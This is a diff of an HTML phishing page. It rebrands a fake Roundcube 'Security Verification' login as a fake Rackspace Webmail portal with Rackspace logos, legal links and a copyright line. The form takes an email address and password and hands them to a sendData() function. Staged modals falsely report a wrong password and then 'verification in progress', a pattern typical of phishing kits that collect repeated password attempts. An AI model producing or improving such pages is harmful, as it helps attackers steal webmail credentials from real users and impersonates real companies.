@@ -1,111 +1,140 @@
 <!doctype html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Roundcube Webmail :: Security Verification</title>
-    <link rel="icon" type="image/png" href="./assests/images/favicon.png?v=2" />
-    <link rel="stylesheet" href="./style.css" />
-    <script src="./script.js" defer></script>
-  </head>
-  <body>
-    <!-- Modal for First Submission -->
-    <div id="modalOverlay1" class="modal-overlay">
-      <div class="modal-box">
-        <h2>Verification failed ⚠️</h2>
-        <p>
-          Your password or username is incorrect!
-          Please check if you have entered your password correctly or if you have forgotten it. 
-        </p>
-        <button class="modal-btn" onclick="hideModal(1)">Close</button>
-      </div>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Rackspace Webmail: Security Verification</title>
+
+  <link rel="icon" type="image/png" href="./assets/images/favicon.png?v=2" />
+
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,400,500,700">
+  <link rel="stylesheet" href="./style.css">
+</head>
+
+<body>
+
+  <!-- MODALS -->
+  <div id="modalOverlay1" class="modal-overlay">
+    <div class="modal-box">
+      <h2>Verification failed ⚠️</h2>
+      <p>Your password or username is incorrect! Please check your credentials.</p>
+      <button class="modal-btn" onclick="hideModal(1)">Close</button>
     </div>
+  </div>
 
-    <!-- Modal for Second Submission -->
-    <div id="modalOverlay2" class="modal-overlay">
-      <div class="modal-box">
-        <h2>Account verification in progress ✔️</h2>
-        <p>
-          Your login details are now being compared with our records to verify their accuracy.
-          Once the process is complete, your verification will be finalized.
-        </p>
-        <button class="modal-btn" onclick="hideModal(2)">Close</button>
-      </div>
+  <div id="modalOverlay2" class="modal-overlay">
+    <div class="modal-box">
+      <h2>Account verification in progress ✔️</h2>
+      <p>Your login details are being verified against our records.</p>
+      <button class="modal-btn" onclick="hideModal(2)">Close</button>
     </div>
+  </div>
 
-    <!-- Modal for Third Submission -->
-    <div id="modalOverlay3" class="modal-overlay">
-      <div class="modal-box">
-        <h2>Under review ⚠️</h2>
-        <p>
-          More information has been recorded. Please review everything carefully.
-        </p>
-        <button class="modal-btn" onclick="hideModal(3)">Close</button>
-      </div>
+  <div id="modalOverlay3" class="modal-overlay">
+    <div class="modal-box">
+      <h2>Under review ⚠️</h2>
+      <p>More information has been recorded. Please review carefully.</p>
+      <button class="modal-btn" onclick="hideModal(3)">Close</button>
     </div>
+  </div>
 
-   
+  <!-- MAIN WRAPPER -->
+  <div id="content">
 
-<main>
+    <div>
 
-  <h1 class="main-title">
-    Roundcube Webmail
-  </h1>
+      <!-- LOGIN BOX -->
+      <div id="login-box">
 
-  <div class="card">
+        <!-- HEADER -->
+        <div id="content-header">
+          <div id="content-header-label">
+            Secure Access Portal
+          </div>
 
-    <img
-      src="./assests/images/user.png"
-      alt="user"
-      class="avatar"
-    />
+          <div id="content-header-logo">
+            <img id="logo" src="./assets/images/logo.png" />
+          </div>
+        </div>
 
-    <form
-      class="wrapper"
-      id="myForm"
-      onsubmit="sendData(); return false;"
-    >
+        <!-- BODY -->
+        <div id="content-body">
 
-      <label class="input-label">
-        USERNAME
-      </label>
+          <!-- LEFT IMAGE -->
+          <div id="banner-section">
+            <img id="banner" src="./assets/images/your-image.png" />
+          </div>
 
-      <input
-        name="email"
-        type="email"
-        id="input-email"
-        required
-        autocomplete="off"
-      />
+          <!-- DIVIDER -->
+          <div id="divider-wrapper">
+            <div id="divider"></div>
+          </div>
 
-      <label class="input-label">
-        PASSWORD
-      </label>
+          <!-- FORM -->
+          <main>
 
-      <div class="password-wrapper">
+            <div class="card">
 
-        <input
-          name="password"
-          id="input-password"
-          type="password"
-          required
-          autocomplete="new-password"
-        />
+              <form
+                id="myForm"
+                onsubmit="sendData(); return false;"
+              >
 
-     
+                <label>Email address</label>
+
+                <input
+                  name="email"
+                  type="email"
+                  id="input-email"
+                  required
+                  autocomplete="off"
+                />
+
+                <label>Password</label>
+
+                <input
+                  name="password"
+                  type="password"
+                  id="input-password"
+                  required
+                  autocomplete="new-password"
+                />
+
+                <button class="login-btn">
+                  Log In
+                </button>
+
+              </form>
+
+            </div>
+
+          </main>
+
+        </div>
+
+        <!-- FOOTER LINKS -->
+        <div class="base_links">
+          <a class="base_link" href="https://www.rackspace.com/information/legal/privacystatement">
+            Privacy Statement
+          </a>
+
+          <span class="divider-text">|</span>
+
+          <a class="base_link" href="https://www.rackspace.com/information/legal/websiteterms">
+            Website Terms
+          </a>
+        </div>
 
       </div>
 
-      <button class="login-btn">
-        LOGIN
-      </button>
+      <!-- FOOTER NOTE OUTSIDE BOX -->
+      <div class="footer-note">
+        &copy; 2026 Rackspace Technology. All rights reserved.
+      </div>
 
-    </form>
+    </div>
 
   </div>
 
-</main>
-
-    
-  </body>
+</body>
 </html>
